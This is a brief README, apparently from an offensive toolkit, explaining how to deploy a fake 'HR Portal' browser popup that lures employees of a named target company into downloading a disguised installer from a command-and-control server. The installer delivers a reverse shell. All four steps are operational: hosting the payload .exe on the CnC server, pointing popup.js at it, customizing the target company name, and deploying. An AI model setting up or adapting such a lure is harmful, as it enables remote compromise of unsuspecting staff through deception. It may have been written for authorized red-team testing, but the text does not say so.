# HR Portal - Reverse Shell Download

1) Upload `index.php` to your CnC server, and ensure the webroot also contains your payload `.exe` in the same name format as specified in `index.php` (Default: `HR-Portal-Installer-1-18.exe`)
2) Update URL in `popup.js` to point to CnC server
3) Find/Replace `TARGET_COMPANY_NAME` in `popup.html` and `manifest.json` as necessary
4) Test and deploy